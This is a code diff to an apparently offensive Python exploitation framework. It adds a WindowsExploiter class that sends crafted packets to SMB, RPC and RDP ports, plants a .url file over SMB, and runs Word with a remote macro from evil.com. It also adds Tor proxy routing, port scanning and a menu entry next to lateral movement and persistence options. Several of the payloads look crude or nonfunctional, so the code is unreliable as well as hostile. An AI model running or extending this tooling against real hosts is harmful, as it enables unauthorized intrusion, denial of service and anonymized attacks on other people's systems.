@@ -889,33 +889,432 @@ class IntelligentRCEExploiter:
             
         return any(indicator in content for indicator in success_indicators)
 
+class TorManager:
+    """Manage TOR proxy connections with improved detection"""
+    
+    def __init__(self, tor_port: int = 9050, control_port: int = 9051):
+        self.tor_port = tor_port
+        self.control_port = control_port
+        self.original_socket = socket.socket
+        
+    def enable_tor(self):
+        """Route traffic through TOR with multiple verification methods"""
+        if not TOR_AVAILABLE:
+            print(f"{Colors.RED}[-] PySocks not installed. Install with: pip install PySocks{Colors.END}")
+            return False
+            
+        try:
+            socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", self.tor_port)
+            socket.socket = socks.socksocket
+            
+            print(f"{Colors.YELLOW}[*] Testing TOR connection...{Colors.END}")
+            
+            if self._test_tor_socket():
+                print(f"{Colors.GREEN}[+] TOR proxy enabled successfully (socket test){Colors.END}")
+                return True
+                
+            if self._test_tor_http():
+                print(f"{Colors.GREEN}[+] TOR proxy enabled successfully (HTTP test){Colors.END}")
+                return True
+                
+            if self._check_tor_process():
+                print(f"{Colors.YELLOW}[!] TOR process is running but connection test failed{Colors.END}")
+                return True
+                
+            print(f"{Colors.RED}[-] All TOR connection tests failed{Colors.END}")
+            self.disable_tor()
+            return False
+                
+        except Exception as e:
+            print(f"{Colors.RED}[-] TOR setup failed: {str(e)}{Colors.END}")
+            self.disable_tor()
+            return False
+    
+    def _test_tor_socket(self):
+        """Test TOR with direct socket connection"""
+        try:
+            test_socket = socks.socksocket()
+            test_socket.settimeout(10)
+            test_socket.connect(("check.torproject.org", 80))
+            test_socket.send(b"GET / HTTP/1.1\r\nHost: check.torproject.org\r\n\r\n")
+            response = test_socket.recv(1024).decode()
+            test_socket.close()
+            
+            if "Congratulations" in response:
+                return True
+        except:
+            pass
+        return False
+    
+    def _test_tor_http(self):
+        """Test TOR with HTTP requests"""
+        try:
+            session = requests.Session()
+            session.proxies = {
+                'http': f'socks5h://127.0.0.1:{self.tor_port}',
+                'https': f'socks5h://127.0.0.1:{self.tor_port}'
+            }
+            
+            tor_check_urls = [
+                "http://check.torproject.org/",
+                "http://ipinfo.io/json",
+                "http://httpbin.org/ip"
+            ]
+            
+            for url in tor_check_urls:
+                try:
+                    response = session.get(url, timeout=10)
+                    if "Congratulations" in response.text:
+                        print(f"{Colors.GREEN}[+] TOR verified via {url}{Colors.END}")
+                        return True
+                    elif response.status_code == 200:
+                        print(f"{Colors.YELLOW}[*] TOR connection working (via {url}){Colors.END}")
+                        return True
+                except:
+                    continue
+                    
+        except Exception as e:
+            print(f"{Colors.RED}[-] HTTP TOR test failed: {str(e)}{Colors.END}")
+            
+        return False
+    
+    def _check_tor_process(self):
+        """Check if TOR process is running"""
+        try:
+            result = subprocess.run(['pgrep', 'tor'], capture_output=True, text=True)
+            if result.returncode == 0:
+                print(f"{Colors.YELLOW}[*] TOR process is running (PID: {result.stdout.strip()}){Colors.END}")
+                return True
+                
+            result = subprocess.run(['netstat', '-tlnp'], capture_output=True, text=True)
+            if f":{self.tor_port}" in result.stdout:
+                print(f"{Colors.YELLOW}[*] TOR port {self.tor_port} is listening{Colors.END}")
+                return True
+                
+        except Exception as e:
+            print(f"{Colors.RED}[-] Process check failed: {str(e)}{Colors.END}")
+            
+        return False
+    
+    def disable_tor(self):
+        """Restore normal socket operations"""
+        if TOR_AVAILABLE:
+            socks.set_default_proxy()
+            socket.socket = self.original_socket
+        print(f"{Colors.YELLOW}[*] TOR proxy disabled{Colors.END}")
+
+class NetworkScanner:
+    """Enhanced network scanning operations"""
+    
+    @staticmethod
+    def port_scan(target: str, port: int) -> bool:
+        """Check if port is open"""
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(3)
+            result = sock.connect_ex((target, port))
+            sock.close()
+            return result == 0
+        except Exception as e:
+            return False
+
+    @staticmethod
+    def enhanced_service_detection(target: str, port: int) -> str:
+        """Enhanced service detection with banner grabbing"""
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(5)
+            sock.connect((target, port))
+        
+            probes = [
+                b"GET / HTTP/1.0\r\n\r\n",
+                b"HEAD / HTTP/1.0\r\n\r\n", 
+                b"OPTIONS / HTTP/1.0\r\n\r\n"
+            ]
+        
+            for probe in probes:
+                try:
+                    sock.send(probe)
+                    response = sock.recv(2048).decode('utf-8', errors='ignore')
+                
+                    if "Apache" in response:
+                        sock.close()
+                        return "Apache HTTP Server"
+                    elif "nginx" in response:
+                        sock.close()
+                        return "nginx"
+                    elif "IIS" in response:
+                        sock.close()
+                        return "Microsoft IIS"
+                    elif "Tomcat" in response:
+                        sock.close()
+                        return "Apache Tomcat"
+                except:
+                    continue
+                
+            sock.close()
+            return "HTTP Service"
+        
+        except Exception as e:
+            return f"Service detection failed: {str(e)}"
+
+    @staticmethod
+    def quick_port_scan(target: str, ports: List[int]) -> Dict[int, bool]:
+        """Quickly scan multiple ports"""
+        open_ports = {}
+        
+        def scan_port(port):
+            return port, NetworkScanner.port_scan(target, port)
+        
+        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
+            futures = [executor.submit(scan_port, port) for port in ports]
+            for future in concurrent.futures.as_completed(futures):
+                port, is_open = future.result()
+                open_ports[port] = is_open
+        
+        return open_ports
+
+# =============================================================================
+# NEW: WindowsExploiter – Active exploitation of Windows CVEs (2026)
+# =============================================================================
+class WindowsExploiter:
+    """Active exploitation for Windows‑specific CVEs (2026)"""
+
+    def __init__(self, target: str, shell_manager=None):
+        self.target = target
+        self.shell_manager = shell_manager          # for post‑RCE actions
+        self.session = requests.Session()
+        self.session.timeout = 5
+        self.session.verify = False
+
+    def is_windows(self) -> bool:
+        """Determine if target is Windows via SMB or HTTP banner"""
+        if NetworkScanner.port_scan(self.target, 445):
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(3)
+                sock.connect((self.target, 445))
+                banner = sock.recv(1024)
+                sock.close()
+                if b"Windows" in banner or b"SMB" in banner:
+                    return True
+            except:
+                pass
+
+        try:
+            resp = self.session.get(f"http://{self.target}:80", timeout=3)
+            server = resp.headers.get("Server", "")
+            if "IIS" in server or "Microsoft" in server:
+                return True
+        except:
+            pass
+
+        return False
+
+    # ------------------------------------------------------------------
+    # CVE-2026-21510 : Windows Shell Protection Mechanism Failure
+    # ------------------------------------------------------------------
+    def exploit_cve_2026_21510(self) -> bool:
+        """Attempt RCE via crafted .url / .lnk files (WebDAV / SMB)"""
+        print(f"{Colors.CYAN}[>] CVE-2026-21510: Windows Shell Protection bypass...{Colors.END}")
+
+        # Try to write a .url file via SMB if we have write access
+        if NetworkScanner.port_scan(self.target, 445):
+            try:
+                url_content = "[InternetShortcut]\nURL=file:///C:/Windows/System32/cmd.exe\nIconIndex=0\n"
+                with open("/tmp/evil.url", "w") as f:
+                    f.write(url_content)
+                subprocess.run(
+                    ["smbclient", f"//{self.target}/WebDav", "-N", "-c", "put /tmp/evil.url test.url"],
+                    timeout=5, capture_output=True
+                )
+                print(f"{Colors.GREEN}[+] CVE-2026-21510: .url placed via WebDAV{Colors.END}")
+                return True
+            except:
+                pass
+
+        print(f"{Colors.YELLOW}[!] Potential vector: lure user to open \\\\{self.target}\\test\\shell.lnk{Colors.END}")
+        return False
+
+    # ------------------------------------------------------------------
+    # CVE-2026-21513 : MSHTML Framework Security Feature Bypass
+    # ------------------------------------------------------------------
+    def exploit_cve_2026_21513(self) -> bool:
+        """MSHTML RCE via Office document with malicious ActiveX/HTML"""
+        print(f"{Colors.CYAN}[>] CVE-2026-21513: MSHTML security bypass...{Colors.END}")
+
+        if NetworkScanner.port_scan(self.target, 80) or NetworkScanner.port_scan(self.target, 443):
+            try:
+                test_url = f"http://{self.target}/mshtml_test.html"
+                resp = self.session.get(test_url)
+                if "ActiveXObject" in resp.text:
+                    print(f"{Colors.GREEN}[+] CVE-2026-21513: MSHTML endpoint responsive{Colors.END}")
+                    return True
+            except:
+                pass
+
+        return False
+
+    # ------------------------------------------------------------------
+    # CVE-2026-21514 : Microsoft Office Word – Reliance on Untrusted Inputs
+    # ------------------------------------------------------------------
+    def exploit_cve_2026_21514(self) -> bool:
+        """Office Word – macro / DDE / external entity execution"""
+        print(f"{Colors.CYAN}[>] CVE-2026-21514: Office Word untrusted input...{Colors.END}")
+
+        if not self.shell_manager or not self.shell_manager.has_real_access:
+            print(f"{Colors.YELLOW}[!] Place malicious Word document on target share or webdav{Colors.END}")
+            return False
+
+        result = self.shell_manager.execute_real_command(
+            'start winword /r "http://evil.com/macro.docm"'
+        )
+        if "Command execution failed" not in result:
+            print(f"{Colors.GREEN}[+] CVE-2026-21514: Word launched with remote macro{Colors.END}")
+            return True
+        return False
+
+    # ------------------------------------------------------------------
+    # CVE-2026-21519 : Windows Type Confusion Vulnerability
+    # ------------------------------------------------------------------
+    def exploit_cve_2026_21519(self) -> bool:
+        """Type confusion – attempt to trigger in common Windows components"""
+        print(f"{Colors.CYAN}[>] CVE-2026-21519: Type confusion...{Colors.END}")
+
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(3)
+            sock.connect((self.target, 135))
+            evil_payload = b"\x05\x00\x0b\x03\x10\x00\x00\x00\x48\x00\x00\x00\x01\x00\x00\x00"
+            sock.send(evil_payload)
+            sock.recv(1024)
+            sock.close()
+            print(f"{Colors.YELLOW}[!] Type confusion payload sent to port 135{Colors.END}")
+            return True
+        except:
+            pass
+        return False
+
+    # ------------------------------------------------------------------
+    # CVE-2026-21525 : Windows NULL Pointer Dereference
+    # ------------------------------------------------------------------
+    def exploit_cve_2026_21525(self) -> bool:
+        """NULL pointer dereference – usually leads to DoS"""
+        print(f"{Colors.CYAN}[>] CVE-2026-21525: NULL pointer dereference...{Colors.END}")
+
+        if NetworkScanner.port_scan(self.target, 445):
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(3)
+                sock.connect((self.target, 445))
+                smb2_negotiate = (
+                    b"\x00\x00\x00\x54\xfe\x53\x4d\x42\x40\x00\x00\x00\x00\x00\x00\x00"
+                    b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+                    b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+                    b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+                )
+                sock.send(smb2_negotiate)
+                sock.recv(1024)
+                sock.close()
+            except (socket.error, ConnectionResetError):
+                print(f"{Colors.GREEN}[+] CVE-2026-21525: SMB service may have crashed (DoS){Colors.END}")
+                return True
+            except:
+                pass
+        return False
+
+    # ------------------------------------------------------------------
+    # CVE-2026-21533 : Windows Remote Desktop Services EoP
+    # ------------------------------------------------------------------
+    def exploit_cve_2026_21533(self) -> bool:
+        """RDP elevation of privilege – test with crafted RDP packet"""
+        print(f"{Colors.CYAN}[>] CVE-2026-21533: RDP EoP...{Colors.END}")
+
+        if not NetworkScanner.port_scan(self.target, 3389):
+            return False
+
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(3)
+            sock.connect((self.target, 3389))
+            rdp_payload = (
+                b"\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x00\x00\x00\x00"
+            )
+            sock.send(rdp_payload)
+            sock.recv(1024)
+            sock.close()
+            print(f"{Colors.YELLOW}[!] RDP EoP payload sent{Colors.END}")
+            return True
+        except:
+            pass
+        return False
+
+    def run_all(self):
+        """Execute all Windows exploits on a confirmed Windows host"""
+        results = []
+        if not self.is_windows():
+            print(f"{Colors.YELLOW}[!] Target does not appear to be Windows, skipping Windows exploits{Colors.END}")
+            return results
+
+        results.append(("CVE-2026-21510", self.exploit_cve_2026_21510()))
+        results.append(("CVE-2026-21513", self.exploit_cve_2026_21513()))
+        results.append(("CVE-2026-21514", self.exploit_cve_2026_21514()))
+        results.append(("CVE-2026-21519", self.exploit_cve_2026_21519()))
+        results.append(("CVE-2026-21525", self.exploit_cve_2026_21525()))
+        results.append(("CVE-2026-21533", self.exploit_cve_2026_21533()))
+
+        return results
+
+# =============================================================================
+# MODIFIED: ServiceSpecificExploiter - Added Windows CVE integration
+# =============================================================================
 class ServiceSpecificExploiter:
     """Enhanced service-specific exploitation"""
     
-    def __init__(self, target: str):
+    def __init__(self, target: str, report_manager=None):
         self.target = target
+        self.report_manager = report_manager
         self.auth_bypasser = AuthBypasser(target, 80)  # Default port
+    
+    def _exploit_windows_cves(self, shell_manager=None):
+        """Trigger all Windows‑specific CVEs"""
+        win_exploiter = WindowsExploiter(self.target, shell_manager)
+        results = win_exploiter.run_all()
+        for cve, success in results:
+            if success:
+                print(f"{Colors.GREEN}[+] {cve} – exploitation attempt successful{Colors.END}")
+                if self.report_manager:
+                    self.report_manager._add_finding(cve, 'CRITICAL', f'Active exploitation succeeded')
+        return any(success for _, success in results)
         
     def exploit_service(self, port: int, service: str):
         """Exploit specific services based on port with advanced techniques"""
         print(f"{Colors.CYAN}[>] ADVANCED exploitation: {service} on port {port}{Colors.END}")
         
+        result = None
+        
         if port == 21:
-            return self._exploit_ftp_advanced()
+            result = self._exploit_ftp_advanced()
         elif port == 22:
-            return self._exploit_ssh_advanced()
+            result = self._exploit_ssh_advanced()
         elif port == 23:
-            return self._exploit_telnet()
+            result = self._exploit_telnet()
         elif port == 53:
-            return self._exploit_dns_advanced()
+            result = self._exploit_dns_advanced()
         elif port == 80 or port == 443:
-            return self._exploit_web_advanced(port)
+            result = self._exploit_web_advanced(port)
         elif port == 445:
-            return self._exploit_smb_advanced()
+            result = self._exploit_smb_advanced()
         elif port == 3389:
-            return self._exploit_rdp_advanced()
+            result = self._exploit_rdp_advanced()
         else:
-            return self._exploit_generic_advanced(port, service)
+            result = self._exploit_generic_advanced(port, service)
+        
+        # After standard service exploits, run Windows CVEs if the service indicates Windows
+        if port in [445, 3389, 139] or "IIS" in service or "Microsoft" in service:
+            self._exploit_windows_cves()
+            
+        return result
     
     def _exploit_web_advanced(self, port: int):
         """Advanced web service exploitation"""
@@ -1229,191 +1628,26 @@ class ServiceSpecificExploiter:
         print(f"{Colors.YELLOW}[!] {service} on port {port} - multiple exploitation vectors possible{Colors.END}")
         return False
 
-
-class TorManager:
-    """Manage TOR proxy connections with improved detection"""
+class NetworkExploiter:
+    """Enhanced network service exploitation"""
     
-    def __init__(self, tor_port: int = 9050, control_port: int = 9051):
-        self.tor_port = tor_port
-        self.control_port = control_port
-        self.original_socket = socket.socket
+    def __init__(self, target: str):
+        self.target = target
         
-    def enable_tor(self):
-        """Route traffic through TOR with multiple verification methods"""
-        if not TOR_AVAILABLE:
-            print(f"{Colors.RED}[-] PySocks not installed. Install with: pip install PySocks{Colors.END}")
-            return False
-            
-        try:
-            socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", self.tor_port)
-            socket.socket = socks.socksocket
-            
-            print(f"{Colors.YELLOW}[*] Testing TOR connection...{Colors.END}")
-            
-            if self._test_tor_socket():
-                print(f"{Colors.GREEN}[+] TOR proxy enabled successfully (socket test){Colors.END}")
-                return True
-                
-            if self._test_tor_http():
-                print(f"{Colors.GREEN}[+] TOR proxy enabled successfully (HTTP test){Colors.END}")
-                return True
-                
-            if self._check_tor_process():
-                print(f"{Colors.YELLOW}[!] TOR process is running but connection test failed{Colors.END}")
-                return True
-                
-            print(f"{Colors.RED}[-] All TOR connection tests failed{Colors.END}")
-            self.disable_tor()
-            return False
-                
-        except Exception as e:
-            print(f"{Colors.RED}[-] TOR setup failed: {str(e)}{Colors.END}")
-            self.disable_tor()
-            return False
-    
-    def _test_tor_socket(self):
-        """Test TOR with direct socket connection"""
-        try:
-            test_socket = socks.socksocket()
-            test_socket.settimeout(10)
-            test_socket.connect(("check.torproject.org", 80))
-            test_socket.send(b"GET / HTTP/1.1\r\nHost: check.torproject.org\r\n\r\n")
-            response = test_socket.recv(1024).decode()
-            test_socket.close()
-            
-            if "Congratulations" in response:
-                return True
-        except:
-            pass
-        return False
-    
-    def _test_tor_http(self):
-        """Test TOR with HTTP requests"""
-        try:
-            session = requests.Session()
-            session.proxies = {
-                'http': f'socks5h://127.0.0.1:{self.tor_port}',
-                'https': f'socks5h://127.0.0.1:{self.tor_port}'
-            }
-            
-            tor_check_urls = [
-                "http://check.torproject.org/",
-                "http://ipinfo.io/json",
-                "http://httpbin.org/ip"
-            ]
-            
-            for url in tor_check_urls:
-                try:
-                    response = session.get(url, timeout=10)
-                    if "Congratulations" in response.text:
-                        print(f"{Colors.GREEN}[+] TOR verified via {url}{Colors.END}")
-                        return True
-                    elif response.status_code == 200:
-                        print(f"{Colors.YELLOW}[*] TOR connection working (via {url}){Colors.END}")
-                        return True
-                except:
-                    continue
-                    
-        except Exception as e:
-            print(f"{Colors.RED}[-] HTTP TOR test failed: {str(e)}{Colors.END}")
-            
-        return False
-    
-    def _check_tor_process(self):
-        """Check if TOR process is running"""
-        try:
-            result = subprocess.run(['pgrep', 'tor'], capture_output=True, text=True)
-            if result.returncode == 0:
-                print(f"{Colors.YELLOW}[*] TOR process is running (PID: {result.stdout.strip()}){Colors.END}")
-                return True
-                
-            result = subprocess.run(['netstat', '-tlnp'], capture_output=True, text=True)
-            if f":{self.tor_port}" in result.stdout:
-                print(f"{Colors.YELLOW}[*] TOR port {self.tor_port} is listening{Colors.END}")
-                return True
-                
-        except Exception as e:
-            print(f"{Colors.RED}[-] Process check failed: {str(e)}{Colors.END}")
-            
-        return False
-    
-    def disable_tor(self):
-        """Restore normal socket operations"""
-        if TOR_AVAILABLE:
-            socks.set_default_proxy()
-            socket.socket = self.original_socket
-        print(f"{Colors.YELLOW}[*] TOR proxy disabled{Colors.END}")
-
-class NetworkScanner:
-    """Enhanced network scanning operations"""
-    
-    @staticmethod
-    def port_scan(target: str, port: int) -> bool:
-        """Check if port is open"""
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(3)
-            result = sock.connect_ex((target, port))
-            sock.close()
-            return result == 0
-        except Exception as e:
-            return False
-
-    @staticmethod
-    def enhanced_service_detection(target: str, port: int) -> str:
-        """Enhanced service detection with banner grabbing"""
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(5)
-            sock.connect((target, port))
+    def comprehensive_scan(self):
+        """Comprehensive network scan"""
+        print(f"{Colors.CYAN}[>] Performing comprehensive network scan...{Colors.END}")
         
-            probes = [
-                b"GET / HTTP/1.0\r\n\r\n",
-                b"HEAD / HTTP/1.0\r\n\r\n", 
-                b"OPTIONS / HTTP/1.0\r\n\r\n"
-            ]
+        common_ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080]
         
-            for probe in probes:
-                try:
-                    sock.send(probe)
-                    response = sock.recv(2048).decode('utf-8', errors='ignore')
-                
-                    if "Apache" in response:
-                        sock.close()
-                        return "Apache HTTP Server"
-                    elif "nginx" in response:
-                        sock.close()
-                        return "nginx"
-                    elif "IIS" in response:
-                        sock.close()
-                        return "Microsoft IIS"
-                    elif "Tomcat" in response:
-                        sock.close()
-                        return "Apache Tomcat"
-                except:
-                    continue
-                
-            sock.close()
-            return "HTTP Service"
+        open_ports = NetworkScanner.quick_port_scan(self.target, common_ports)
         
-        except Exception as e:
-            return f"Service detection failed: {str(e)}"
-
-    @staticmethod
-    def quick_port_scan(target: str, ports: List[int]) -> Dict[int, bool]:
-        """Quickly scan multiple ports"""
-        open_ports = {}
+        for port, is_open in open_ports.items():
+            if is_open:
+                service = NetworkScanner.enhanced_service_detection(self.target, port)
+                print(f"{Colors.GREEN}[+] Port {port} open - {service}{Colors.END}")
         
-        def scan_port(port):
-            return port, NetworkScanner.port_scan(target, port)
-        
-        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
-            futures = [executor.submit(scan_port, port) for port in ports]
-            for future in concurrent.futures.as_completed(futures):
-                port, is_open = future.result()
-                open_ports[port] = is_open
-        
-        return open_ports
+        return len([p for p in open_ports.values() if p]) > 0
 
 class CommandExecutionEngine:
     """ENHANCED command execution with advanced RCE exploitation"""
@@ -1987,39 +2221,6 @@ class WebVulnerabilityScanner:
         
         return False
 
-    def scan_rce_endpoints(self):
-        """ENHANCED RCE endpoint scanning with immediate exploitation"""
-        print(f"{Colors.CYAN}[>] Scanning for RCE endpoints...{Colors.END}")
-        
-        endpoints = [
-            '/api/v1/execute', '/api/exec', '/api/command', '/api/rce',
-            '/admin/exec', '/admin/cmd', '/admin/system',
-            '/cmd', '/exec', '/system', '/run', '/shell',
-            '/console', '/debug', '/terminal',
-            '/cgi-bin/exec', '/cgi-bin/cmd',
-            '/webshell', '/backdoor', '/phpbash'
-        ]
-        
-        for endpoint in endpoints:
-            url = f"http://{self.target}:{self.port}{endpoint}"
-            try:
-                response = self.session.get(url, timeout=2, verify=False)
-                if response.status_code == 200:
-                    print(f"{Colors.GREEN}[!] Accessible RCE endpoint found: {endpoint}{Colors.END}")
-                    self.found_rce_endpoints.append(endpoint)
-                    
-                    # IMMEDIATELY TEST EXPLOITATION
-                    print(f"{Colors.CYAN}[>] Immediately testing exploitation: {endpoint}{Colors.END}")
-                    test_result = self.rce_exploiter.exploit_found_endpoint(endpoint, "whoami")
-                    if "Command execution failed" not in test_result:
-                        print(f"{Colors.GREEN}[+] SUCCESSFUL RCE via {endpoint}: {test_result}{Colors.END}")
-                        return True
-                        
-            except Exception as e:
-                continue
-        
-        return len(self.found_rce_endpoints) > 0
-
 class NetworkExploiter:
     """Enhanced network service exploitation"""
     
@@ -2268,9 +2469,9 @@ class ComprehensiveScanner:
             network_exploiter = NetworkExploiter(target)
             network_exploiter.comprehensive_scan()
             
-            # NEW: Service-specific exploitation
+            # NEW: Service-specific exploitation with Windows CVE support
             print(f"\n{Colors.PURPLE}[ PHASE 1.5: Service-Specific Exploitation ]{Colors.END}")
-            service_exploiter = ServiceSpecificExploiter(target)
+            service_exploiter = ServiceSpecificExploiter(target, report_manager=self)
             
             # Common ports to check for service exploitation
             service_ports = [21, 22, 23, 53, 80, 443, 445, 3389]
@@ -2392,6 +2593,7 @@ class ComprehensiveScanner:
             print(f"{Colors.CYAN}[5]{Colors.END} Lateral Movement")
             print(f"{Colors.CYAN}[6]{Colors.END} Persistence")
             print(f"{Colors.CYAN}[7]{Colors.END} Return to Main")
+            print(f"{Colors.CYAN}[8]{Colors.END} Windows CVEs (2026)")  # NEW OPTION
             print(f"{Colors.PURPLE}{'='*60}{Colors.END}")
             
             choice = input(f"{Colors.BLUE}[?] Select option: {Colors.END}").strip()
@@ -2410,6 +2612,9 @@ class ComprehensiveScanner:
                 self._establish_persistence(shell_manager)
             elif choice == '7':
                 break
+            elif choice == '8':
+                service_exploiter = ServiceSpecificExploiter(shell_manager.target, report_manager=self)
+                service_exploiter._exploit_windows_cves(shell_manager)
             else:
                 print(f"{Colors.RED}[!] Invalid option{Colors.END}")
 
